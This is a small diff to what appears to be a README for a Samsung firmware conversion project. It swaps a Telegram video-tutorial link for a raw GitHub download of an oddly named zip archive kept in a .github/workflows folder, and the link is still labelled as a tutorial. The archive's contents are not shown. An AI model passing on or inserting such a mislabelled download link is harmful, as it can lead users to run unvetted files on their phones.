@@ -8,5 +8,5 @@
 
 <br>Read readme after unzipping the file </br>
 <br>Vedio Tutorial </br>
-https://t.me/samsung_galaxy_a05_a055f_a055m/48
+https://github.com/santinostaana13/samsung_erofs_to_ext4_non_gki/raw/refs/heads/main/.github/workflows/non_ext_gki_erofs_samsung_to_rubblestone.zip
 
